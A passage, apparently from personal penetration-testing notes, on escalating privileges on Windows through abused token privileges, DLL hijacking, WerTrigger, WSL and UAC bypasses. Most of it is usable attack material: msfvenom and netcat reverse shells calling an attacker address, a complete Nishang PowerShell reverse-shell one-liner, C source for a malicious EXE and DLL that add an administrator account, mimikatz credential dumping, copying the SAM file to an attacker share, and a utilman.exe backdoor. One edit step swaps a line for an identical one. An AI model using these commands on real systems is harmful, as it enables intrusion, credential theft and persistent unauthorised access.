	- add current user to local "Administrators" group
		- `.\SeRestoreAbuse.exe "cmd /c net localgroup administrators <USER OWNED> /add"`
		- requires logout and new login for Administrator privileges to be enabled

### SeTakeOwnershipPrivilege

Vulnerability identikit:
- `SeTakeOwnershipPrivilege` privilege for current user

Exploitation:
1. `takeown.exe /f "%windir%\system32"`
2. `icacls.exe "%windir%\system32" /grant "%username%":F`
3. rename `cmd.exe` to `utilman.exe`
4. lock the console and type Win+U

### SeManageVolumePrivilege

Vulnerability identikit:
- `SeManageVolumePrivilege` privilege for current user

Exploitation:
1. cloning [https://github.com/xct/SeManageVolumeAbuse](https://github.com/xct/SeManageVolumeAbuse)
2. compiling project with Visual Studio
3. upload on target these files:
	- SeManageVolumePrivilege.exe
	- `tzres.dll`: `msfvenom -p windows/<x64 o x86>/shell_reverse_tcp LHOST=<IFACE> LPORT=80 -f dll -o tzres.dll`
4. exploitation
	- running `.\SeManageVolumePrivilege`: exploit allows us to get read/write access to all files on disk
	- to get a reverse shell with `SYSTEM` privileges we have 3 options:
	1. DLL Hijacking - *tzres.dll*
		- (attacker) `rlwrap nc -nvlp <REV PORT>`
		- `copy tzres.dll C:\Windows\System32\wbem\tzres.dll`
		- `systeminfo`
	2. *[WerTrigger](#WerTrigger)*
	3. DLL Hijacking - *Printconfig.dll*: details in [https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

### SeAssignPrimaryTokenPrivilege

Vulnerability identikit:
- `SeAssignPrimaryTokenPrivilege` privilege for current user
- Exploitation:
	- info: [https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html](https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html)
	- using [Juicy Potato](#JuicyPotato) or [Rogue Potato](#RoguePotato)

### SeLoadDriverPrivilege

Vulnerability identikit:
- `SeLoadDriverPrivilege` privilege for current user. It provides privilege to load a (vulnerable) driver

Very complex exploitation. I rely on this reference: [https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system](https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system).

Exploitation Steps:
1. create a new "C++ Console App" project in Visual Studio. Let's give the project any name
2. replace all the code in the single CPP file with the contents of the file 'eoploaddriver.cpp' contained in the repository [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/)
3. if `include "stdafx.h"` produces errors for some reason, you can remove it from the code
4. set the project to 'Release' and 'x64'
5. compiling the project and you will obtain an executable .EXE file
6. upload executable file and Capcom.sys drive. Driver is available at [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
7. execute on the target machine: `.\<FILE ESEGUIBILE>.exe System\CurrentControlSet\dfserv C:\absolute\path\to\Capcom.sys`. If the output of command isn't equal to `NTSTATUS: 00000000`, it means that there was an error (note: "dfserv" has no meaning, it can be any).
8. go back to the attacking machine and clone [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
9. in "ExploitCapcom.cpp" file, change the code `TCHAR CommandLine[] = TEXT("C:\Windows\system32\cmd.exe");` to `TCHAR CommandLine[] = TEXT("C:\Windows\system32\cmd.exe");`
10. compiling the project
11. upload reverse shell executable file and executable file produced by the compilation on the target machine. Reverse shell executable file should be located in `C:\absolute\path\to\reverse.exe`
12. activate a *netcat* listener on the attacking host
13. on the target run: `.\ExploitCapcom.exe` - if exploit fails immediately in `CreateFile` then it means the driver has not been loaded

### SeDebugPrivilege

Vulnerability identikit:
- privilegio `SeDebugPrivilege` privilege for current user

Exploitation:
- LSASS dumping with *mimikatz*
- reverse shell:
	1. upload the following script on target machine: [https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
	2. `import-module .\psgetsys.ps1`
	3. identify the PID of a privileged process, e.g. "winlogon": `Get-Process winlogon`
	4. activate listener *netcat*
	5. shell: `[MyProcess]::CreateProcessFromParent("<PID PRIVILEGED PROCESS>","c:\windows\system32\cmd.exe", "/c c:\abssolute\path\to\nc.exe <IP ATTACKER> <REVERSE PORT> -e cmd.exe")`
- *Meterpreter* migration:
	1. generate and upload a Meterpreter payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meter.exe`
	2. a Meterpreter handler is activated on attacker machine: `msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444;run;"`
	3. you run the Meterpreter binary on victim machine directly and you will receive a meterpreter shell
	4. you run the Meterpreter binary on victim machine directly and you will receive a meterpreter shell
		- `getuid` - current username
		- `run windows/gather/win_privs` - current privileges
		- `ps` - running process
	5.  identify the PID of a privileged process, such as "winlogon"
	6. migrate to the privileged process: `migrate <PID PRIVILEGED PROCESS>`
	7. to obtain a classic shell: `shell`

### Privileged-File-Write

Vulnerability identikit:
- write permission in the filesytem `SYSTEM` privileges

Other techniques:
- [https://notes.vulndev.io/wiki/redteam/privilege-escalation/windows/exploiting-privileged-read-write-delete](https://notes.vulndev.io/wiki/redteam/privilege-escalation/windows/exploiting-privileged-read-write-delete)

#### WerTrigger

**Steps**:
1. (on attacker machine) `rlwrap nc -nvlp <REV PORT>`
2. cloning [https://github.com/sailay1996/WerTrigger.git](https://github.com/sailay1996/WerTrigger.git)
3. transfer the files in `bin` folder to the target machine, i.e.:
	- phoneinfo.dll
	- Report.wer
	- WerTrigger.exe
4. transfer `nc64.exe` executable
5. copy the "phoneinfo.dll" file to `C:\Windows\System32\`: `copy phoneinfo.dll C:\Windows\System32\`
6. place 'Report.wer' and 'WerTrigger.exe' in the same folder
7. run "WerTrigger.exe": `.\WerTrigger.exe` - we should have "some kind" of shell; give `dir` command for confirmation
8. to get a SYSTEM shell: `C:\abasolute\path\to\nc64.exe <IP TARGET> <REV PORT> -e cmd.exe`

## OtherTechniques

### WSL

Vulnerability identikit:
1. `bash.exe` or `wsl.exe` in the system
2. root user in the Linux subsystem

Exploitation:
- search `bash` or `wsl` in the system:
	- `where /R c:\windows bash.exe`
	- `where /R c:\windows wsl.exe`
- root user check in the WSL:
	- `</path/to/wsl.exe> whoami` -> `root`
- exploit:
	- `wsl python -c 'PYTHON_REVERSE_SHELL_CODE'`

## Extra

### AVEnumeration

- `sc query windefend` - Windows Defender service info
- `netsh firewall show state` - firewall status info
- `netsh advfirewall show allprofiles` - firewall status info (updated command)
- `netsh advfirewall firewall show rule name=all` - all firewall rules

### permissionsCheck

- `icacls <file/directory>`: file and directory permissions
- `accesschk.exe /accepteula -quv <file>`: permissions on files
- `accesschk.exe /accepteula -dquv <directory>`: permissions on directory
- `accesschk.exe /accepteula -cquv <service name>`: permissions on service
- `accesschk.exe /accepteula -kquv <registry key>`: permissions on registry key
- `accesschk.exe /accepteula -pquv <process>`: permissions on process
- option `-w` shows only objects with write permission
- option `-s` for recursion

### Persistence

**Requirements**:
- CMD shell with SYSTEM privileges or equivalent

#### create administrator account

**Steps**:
1. create a new user account
	- `net user pablo I4mPabl0! /add`
2. add the new user to the "Administrators" group
	- `net localgroup "administrators" pablo /add`
3. use *psexec* to obtain a shell with SYSTEM privileges

#### existing user

**Steps**:
1. add user I control *easily* to a privileged group
	- `net localgroup "administrators" <USERNAME> /add`
	- `net localgroup "Backup Operators" <USERNAME> /add`
	- `net localgroup "Remote Management Users" <USERNAME> /add`
2. use *psexec* to obtain a shell with SYSTEM privileges

### AlternateDataStreams

Alternate Data Streams are only available on NTFS partitions. The important factor for our considerations is that NTFS allows the creation of more than one data attribute for each individual file. The main data stream, what we traditionally consider to be the content of the file, may therefore be joined by one or more **alternate data streams**. 

Some of the characteristics of ADSs that contribute to weakening the security of the system are listed below:

- They are virtually invisible to the user and to programmes that do not support them
- The file size displayed by the system is always and only that of the main stream
- They can be attached to files but also to folders
- They can contain any type of data: a simple text, an image, but also scripts and executable code
- Direct execution of an executable ADS encapsulated in a simple text file is possible
- No limit in size is placed on alternative flows
-The only visible effect following the addition or modification of an ADS is the change of the file date

Useful commands:
- `dir /r` - locate ADS in the current folder (cmd)
- `more < <alternate data stream>` - ADS content of a file (cmd)
- `Get-Item </path/to/file> -Stream *` - all streams of a file (PowerShell)
- `Get-Item </path/to/file> | cat -Stream <stream name>` - ADS content of a file (PowerShell)

### AppData

That's where AppData comes in. It's a hidden folder that resides under each user folder. It's located in `C:\Users\<username>\AppData` and contains program-specific information that may not relate to the program's ability to run, such as user configurations. In your AppData folder, you will find files like:

-   User-specific installations
-   App configuration files
-   Cached files

If you've ever installed a program that asked you whether you wanted to install it for all users or not, it was basically asking you if you wanted to install it into Program Files or AppData. Python is one such program that does this. Additionally, there are three subfolders in AppData, and their differences are important to note.

- **Local**: The Local folder is for storing files that can't move from your user profile and also often contain files that may be too large to synchronize with a server. For example, it might house some files that are needed for a video game to run or your web browser cache, which are files that may be too large or wouldn't make sense to transfer anywhere else. A developer might also use Local to store information that pertains to file paths on this particular machine. Moving these configuration files to another machine might cause programs to stop working, as the file paths would not match up
- **LocalLow**: LocalLow is very similar to Local, but the "low" in the name refers to a lower level of access granted to the application. For example, a browser in incognito mode may be limited to only accessing the LocalLow folder to prevent it from being able to access the normal user data stored in Local.
- **Roaming**: If you use a Windows machine on a domain (that is, a network of computers with a central domain controller that handles your login), then you might be familiar with the Roaming folder. Files in this folder are synced to other devices if you log in on the same domain since they're considered important for using your device. This could be your web browser favorites and bookmarks, important application settings, and more.

## NishangOneLiner

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<IP ATTACKER>',<PORT LISTENER>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
# oppure
$sm=(New-Object Net.Sockets.TCPClient('<IP ATTACKER>',<PORT LISTENER>)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

## WindowsTransfer

### SMBserver

**Attacker**:

```shell
# WINVERSION < Windows 10
sudo python3 examples/smbserver.py <share name> <share dir>

# WINVERSION >= Windows 10
sudo python3 examples/smbserver.py -smb2support -username "<user>" -password "<password>" <share name> <share dir>
[...]
```

**Victim**:

```shell
# IF WINVERSION >= Windows 10
net use Z: \\<attacker IP>\<share name> /user:<user> <password>
# listing 
dir \\<attacker IP>\<share name>
# transfer
copy <victim file>  \\<attacker IP>\<share name>\sam.txt
```

### evil-winrm

If it is possible to gain access via WinRM, the *evil-win* tool makes it very easy to upload and/or download files.

```shell
# upload
upload /opt/Windows/exploits/executables/mimikatz.exe C:\temp\mimikatz.exe
#download
download C:\temp\supersecret.txt /opt/Juggernaut/JUGG-Backup/supersecret.txt
```

## FromLocalServiceToSystem

Credit: [https://itm4n.github.io/localservice-privileges/](https://itm4n.github.io/localservice-privileges/).

Let's assume we have a shell with `NT AUTHORITY\LOCAL SERVICE` without its "powers" (AKA privileges). Use the executable *FullPowers.exe* ([https://github.com/itm4n/FullPowers](https://github.com/itm4n/FullPowers)) to obtain a shell with full privileges.

## RawMaliciousEXE

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```


Per la compilazione (from Kali, 64bit): 
- `kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

## RawMaliciousDLL

```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Per la compilazione (from Kali, 64bit): 
- `kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll`

## UACBypass

The UAC bypass becomes necessary when the following conditions occur:
- user member of the Administrators group
- shell with "Medium Mandatory Level" integrity level

To confirm that UAC is active:
- with `whoami /all`, between the group names we should read 'Medium Mandatory Level'.
- with `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System`: if "EnableLUA" is 1, then UAC is active

### RDP

If target exposes RDP, use the credentials of one of the *Administrators* to access the machine. Start a cmd.exe with administrator privileges to obtain full privileges.

### Invoke-EventViewer

Bypass - Credit: [https://github.com/CsEnox/EventViewer-UACBypass](https://github.com/CsEnox/EventViewer-UACBypass):
1. generate an executable reverse shell and upload to the target:
	- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IFACE> LPORT=<PORT> -f exe -o shell.exe`
2. transfer "Invoke-EventViewer.ps1" file to the target
3. (*target*) `powershell -ep bypass`
4. (*target*) `Import-Module .\Invoke-EventViewer.ps1`
5. (*attacker*) `rlwarp nc -nvlp <PORT>`
6. (*target*) `Invoke-EventViewer C:\absolute\path\to\shell.exe`
7. in the new shell you will have full privileges (check with `whoami /all`)

